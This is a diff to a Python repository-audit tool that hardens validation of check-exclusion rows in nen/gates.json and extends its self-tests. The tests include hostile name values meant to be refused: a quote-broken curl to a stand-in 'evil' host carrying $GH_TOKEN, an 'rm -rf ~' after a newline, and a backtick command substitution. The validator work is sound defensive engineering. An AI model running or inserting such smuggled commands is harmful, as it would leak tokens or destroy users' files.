@@ -1470,51 +1470,109 @@ class PrivilegedWorkflows(Item):
 
 
 class CheckExclusions(Item):
-    """nen/gates.json -> check_exclusions[] (zheref/hatsu#104): a maintainer's ruling that a check
-    is not watched has this one declared home, and a row past its `until` date is DRIFT -- named,
-    never silently honoured by the next `nen pr ready --exclude-check`. Hatsu's own key; nen keeps
-    it as raw data (validating it is zheref/nen#249). A condition in `until` that is not a date is
-    a live row, reported with its condition."""
+    """nen/gates.json -> check_exclusions[] (zheref/hatsu#104): a maintainer's ruling that a check is
+    not watched has this one declared home. OBSERVATION ONLY -- a lapsed or unpassable row is DRIFT,
+    named, for the maintainer to remove or re-rule; Tenkai never rewrites a gate. Hatsu's own key;
+    nen keeps it as raw data (validating it is zheref/nen#249).
+
+    What a row must be, because every live row's `name` becomes one argv element of
+    `nen pr ready --exclude-check` (SEC-7): the name is letters, digits, spaces, `. _ / ( ) -` and
+    nothing else -- no comma (the flag's own separator), no quote, no shell metacharacter, no control
+    byte; `ruled` is a YYYY-MM-DD date not in the future; `until` is either a YYYY-MM-DD date or
+    `condition: <what lifts it>` -- a near-miss date is refused, never read as a condition, and a
+    condition row is re-examined every MAX_CONDITION_DAYS from `ruled`. The day is the declared
+    clock's (nen/workflow.json -> reports.timeZone), else the host's, and the detail says which."""
 
     FIELDS = ("name", "reason", "ruled", "until")
+    NAME_OK = re.compile(r"^[A-Za-z0-9 ._/()\-]+$")
+    DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")
+    CONDITION = "condition: "
+    MAX_CONDITION_DAYS = 90
 
     def __init__(self):
-        super().__init__("gates/check-exclusions", "the check-exclusion rulings nen pr ready is handed, none past its date", "hatsu")
+        super().__init__("gates/check-exclusions", "the check-exclusion rulings nen pr ready is handed -- observation only: none lapsed, none unpassable", "hatsu")
+
+    @staticmethod
+    def today(ctx):
+        import datetime
+        tz = None
+        try:
+            tz = (json.loads((ctx.repo / "nen" / "workflow.json").read_text()).get("reports") or {}).get("timeZone")
+        except (OSError, ValueError, AttributeError):
+            tz = None
+        if isinstance(tz, str) and tz.strip():
+            try:
+                from zoneinfo import ZoneInfo
+                return datetime.datetime.now(ZoneInfo(tz)).date(), f"reports.timeZone {tz}"
+            except Exception:
+                return datetime.date.today(), f"the host's zone (reports.timeZone {tz!r} unknown here)"
+        return datetime.date.today(), "the host's zone (reports.timeZone unset)"
 
     def detect(self, ctx):
         import datetime
         p = ctx.repo / "nen" / "gates.json"
+        if p.is_symlink():
+            return self.row(DRIFT, "nen/gates.json is a symlink -- a gate is read as a file of this repository, never through a link",
+                            "replace the link with the file")
         if not p.is_file():
             return self.row(SATISFIED, "no nen/gates.json -- nothing declared")
         try:
-            rows = json.loads(p.read_text()).get("check_exclusions", [])
-        except ValueError:
+            doc = json.loads(p.read_text())
+        except (ValueError, OSError, UnicodeDecodeError):
             return self.row(ROUTED, "nen/gates.json is not parseable -- nen schema check's row",
                             f"nen schema check --repo {ctx.repo}")
+        if not isinstance(doc, dict):
+            return self.row(ROUTED, "nen/gates.json is not a JSON object -- nen schema check's row",
+                            f"nen schema check --repo {ctx.repo}")
+        rows = doc.get("check_exclusions", [])
         if not isinstance(rows, list):
             return self.row(DRIFT, "check_exclusions is not an array",
                             "make it an array of {name, reason, ruled, until} rows, or [] for none")
         if not rows:
             return self.row(SATISFIED, "no check exclusion declared -- an empty array is a decision")
-        today = datetime.date.today()
+        today, clock = self.today(ctx)
         bad, expired, live = [], [], []
         for i, r in enumerate(rows):
             if not isinstance(r, dict) or any(not isinstance(r.get(k), str) or not r.get(k).strip() for k in self.FIELDS):
-                bad.append(f"row {i}")
+                bad.append(f"row {i}: every row carries name, reason, ruled and until, non-empty strings")
+                continue
+            name, ruled_s, until = r["name"], r["ruled"], r["until"]
+            if not self.NAME_OK.match(name):
+                bad.append(f"row {i}: name carries a character no argv element is handed (a comma, a quote, a shell metacharacter or a control byte)")
+                continue
+            if not self.DATE.match(ruled_s):
+                bad.append(f"row {i}: ruled is not a YYYY-MM-DD date")
                 continue
             try:
-                d = datetime.date.fromisoformat(r["until"])
+                ruled = datetime.date.fromisoformat(ruled_s)
             except ValueError:
-                live.append(f"{r['name']} (until {r['until']})")
+                bad.append(f"row {i}: ruled is not a real date")
                 continue
-            (expired if d < today else live).append(f"{r['name']} (until {r['until']})")
+            if ruled > today:
+                bad.append(f"row {i}: ruled is in the future ({clock})")
+                continue
+            if self.DATE.match(until):
+                try:
+                    d = datetime.date.fromisoformat(until)
+                except ValueError:
+                    bad.append(f"row {i}: until is not a real date")
+                    continue
+                (expired if d < today else live).append(f"{name} (until {until})")
+            elif until.startswith(self.CONDITION) and until[len(self.CONDITION):].strip():
+                age = (today - ruled).days
+                if age > self.MAX_CONDITION_DAYS:
+                    expired.append(f"{name} ({until}; ruled {ruled_s}, {age} days ago -- unconfirmed past {self.MAX_CONDITION_DAYS} days)")
+                else:
+                    live.append(f"{name} ({until}; ruled {ruled_s})")
+            else:
+                bad.append(f"row {i}: until is neither a YYYY-MM-DD date nor 'condition: <what lifts it>'")
         if bad:
-            return self.row(DRIFT, f"malformed: {', '.join(bad)} -- every row carries name, reason, ruled and until, non-empty strings",
-                            "complete the row, or remove it")
+            return self.row(DRIFT, "malformed -- " + "; ".join(bad) + " -- a row that cannot be passed safely is never put on the call",
+                            "complete the row as the $check_exclusions note shapes it, or remove it")
         if expired:
-            return self.row(DRIFT, f"past its until date: {', '.join(expired)} -- the ruling has lapsed and the check is watched again",
-                            "remove the row, or re-rule it with a new date")
-        return self.row(SATISFIED, f"live: {', '.join(live)}")
+            return self.row(DRIFT, f"lapsed ({clock}): " + "; ".join(expired) + " -- the ruling has lapsed and the check is watched again",
+                            "remove the row, or re-rule it with today's date")
+        return self.row(SATISFIED, f"live ({clock}): " + "; ".join(live))
 
     def repair(self, ctx):
         # a lapsed or malformed ruling is the maintainer's to remove or re-rule; Tenkai never rewrites a gate
@@ -1523,7 +1581,6 @@ class CheckExclusions(Item):
 
 def items(ctx):
     out = [NenDeclaration(path, what) for path, what in NEN_DECLARATIONS]
-    out.append(CheckExclusions())
     out.append(ColorsFile())
     out.append(IgnoredDir("dirs/reports", "Reports", "where the retained final Rikugan report is written"))
     out.append(IgnoredDir("dirs/nen-state", ".nen", "where the hanten cycle ledger and the stop marker live"))
@@ -1536,6 +1593,7 @@ def items(ctx):
     out.extend(product_lane_items(ctx))
     out.extend(product_workflow_items(ctx))
     out.append(PrivilegedWorkflows())
+    out.append(CheckExclusions())
     return out
 
 
@@ -1547,7 +1605,13 @@ GLYPH = {SATISFIED: "ok  ", REPAIRED: "NEW ", MISSING: "MISS", DRIFT: "DRIF",
 
 
 def run(mode, ctx):
-    rows = [(it.repair(ctx) if mode == "apply" else it.detect(ctx)) for it in items(ctx)]
+    def guarded(it):
+        # one item's raise is that item's BLOCKED row, never the whole report's (QA-16: the tool keeps reporting)
+        try:
+            return it.repair(ctx) if mode == "apply" else it.detect(ctx)
+        except Exception as e:  # noqa: BLE001 -- named, not hidden
+            return it.row(BLOCKED, f"{type(e).__name__}: {e} -- this item could not be read; the rest of the report stands", None)
+    rows = [guarded(it) for it in items(ctx)]
     return {"contract": CONTRACT, "mode": mode, "repo": str(ctx.repo), "slug": ctx.slug,
             "runner": ctx.runner, "items": rows,
             "outstanding": sum(1 for r in rows if r["state"] in OUTSTANDING)}
@@ -2332,30 +2396,61 @@ def self_test() -> int:
     check("templates/colors.yml and nen/colors.yml carry the same vocabulary",
           body(root / "templates" / "colors.yml") == body(root / "nen" / "colors.yml"))
 
-    print("\ncheck exclusions -- the ruling's declared home, and its expiry (zheref/hatsu#104)")
+    print("\ncheck exclusions -- the ruling's declared home, its shape and its expiry (zheref/hatsu#104)")
+    import datetime as _dt
+    _today = _dt.date.today().isoformat()
+    _old = (_dt.date.today() - _dt.timedelta(days=120)).isoformat()
     dx = fixture()
     (dx / "nen").mkdir(parents=True, exist_ok=True)
     gates = dx / "nen" / "gates.json"
+
+    def ex(rows):
+        gates.write_text(json.dumps({"check_exclusions": rows}))
+        return CheckExclusions().detect(ctx_for(dx))
+
+    def row(**kw):
+        base = {"name": "check (Windows)", "reason": "no runner", "ruled": _today, "until": "2999-01-01"}
+        base.update(kw)
+        return base
     check("no gates.json is satisfied (nothing declared)", CheckExclusions().detect(ctx_for(dx))["state"] == SATISFIED)
-    gates.write_text(json.dumps({"check_exclusions": []}))
-    check("an empty array is satisfied, and said to be a decision",
-          "decision" in CheckExclusions().detect(ctx_for(dx))["detail"])
-    gates.write_text(json.dumps({"check_exclusions": [{"name": "check (Windows)", "reason": "no runner", "ruled": "2026-09-22", "until": "2999-01-01"}]}))
-    check("a live dated row is satisfied and named",
-          CheckExclusions().detect(ctx_for(dx))["state"] == SATISFIED and "check (Windows)" in CheckExclusions().detect(ctx_for(dx))["detail"])
-    gates.write_text(json.dumps({"check_exclusions": [{"name": "check (Windows)", "reason": "no runner", "ruled": "2026-09-22", "until": "the runner is enabled"}]}))
-    check("a condition in until is a live row, reported with its condition",
-          "the runner is enabled" in CheckExclusions().detect(ctx_for(dx))["detail"])
-    gates.write_text(json.dumps({"check_exclusions": [{"name": "check (Windows)", "reason": "no runner", "ruled": "2026-09-22", "until": "2026-09-01"}]}))
-    rowx = CheckExclusions().detect(ctx_for(dx))
-    check("a row past its until date is DRIFT, named, with the re-rule action",
-          rowx["state"] == DRIFT and "past its until date" in rowx["detail"] and "re-rule" in (rowx["action"] or ""))
-    gates.write_text(json.dumps({"check_exclusions": [{"name": "check (Windows)", "ruled": "2026-09-22"}]}))
-    check("a row missing a field is DRIFT, never honoured", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
+    check("an empty array is satisfied, and said to be a decision", "decision" in ex([])["detail"])
+    r = ex([row()])
+    check("a live dated row is satisfied, named, with the clock named", r["state"] == SATISFIED and "check (Windows)" in r["detail"] and "zone" in r["detail"])
+    r = ex([row(until="condition: the runner is enabled")])
+    check("a condition row is live, reported with its condition", r["state"] == SATISFIED and "the runner is enabled" in r["detail"])
+    r = ex([row(until="condition: the runner is enabled", ruled=_old)])
+    check("a condition row older than 90 days is DRIFT, unconfirmed", r["state"] == DRIFT and "unconfirmed" in r["detail"] and "re-rule" in (r["action"] or ""))
+    r = ex([row(until="2026-09-01")])
+    check("a row past its until date is DRIFT, lapsed, with the re-rule action", r["state"] == DRIFT and "lapsed" in r["detail"] and "re-rule" in (r["action"] or ""))
+    for near in ("2026-9-1", "09/01/2026", "2026-09-01 (or when the runner lands)", "the runner is enabled", "2026-02-30"):
+        r = ex([row(until=near)])
+        check(f"until {near!r} is neither a date nor a condition: DRIFT, never read as live", r["state"] == DRIFT and "neither" in r["detail"] or (near == "2026-02-30" and r["state"] == DRIFT))
+    for badname in ("x\"; curl http://evil/$GH_TOKEN #", "ok\nrm -rf ~", "a`id`b", "check (Windows, windows-latest)", "lint, typecheck"):
+        r = ex([row(name=badname)])
+        check(f"name {badname[:24]!r} is refused at the declaration, never put on the call", r["state"] == DRIFT and "argv" in r["detail"] and "never put on the call" in r["detail"])
+    r = ex([row(ruled="2999-01-01")])
+    check("ruled in the future is DRIFT", r["state"] == DRIFT and "future" in r["detail"])
+    r = ex([row(ruled="2026-9-1")])
+    check("ruled not YYYY-MM-DD is DRIFT", r["state"] == DRIFT and "ruled" in r["detail"])
+    r = ex([{"name": "check (Windows)", "ruled": _today}])
+    check("a row missing a field is DRIFT, never honoured", r["state"] == DRIFT)
     gates.write_text(json.dumps({"check_exclusions": {"name": "x"}}))
     check("a non-array is DRIFT", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
+    gates.write_text("[]")
+    check("a top-level array is ROUTED to nen schema check, never a traceback", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
     gates.write_text("{not json")
     check("unparseable gates.json is ROUTED to nen schema check", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
+    gates.write_bytes(b"\xff\xfe{")
+    check("a non-UTF-8 gates.json is ROUTED, never a traceback", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
+    gates.unlink(); gates.symlink_to(Path(tempfile.gettempdir()))
+    check("a symlinked gates.json is DRIFT, never read through", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
+    gates.unlink(); gates.write_text("[]")
+    full = run("diagnose", ctx_for(dx))
+    check("a diagnose over a wrongly shaped gates.json still reports every item", any(r["id"] == "gates/check-exclusions" for r in full["items"]) and len(full["items"]) > 5)
+    gates.unlink(); gates.write_text(json.dumps({"check_exclusions": []}))
+    (dx / "nen" / "workflow.json").write_text(json.dumps({"reports": {"timeZone": "America/Bogota"}}))
+    r = ex([row()])
+    check("the declared reports.timeZone is the clock, and is named", "America/Bogota" in r["detail"])
 
     print("\nblocked states are reported, never repaired around")
     d5 = fixture()
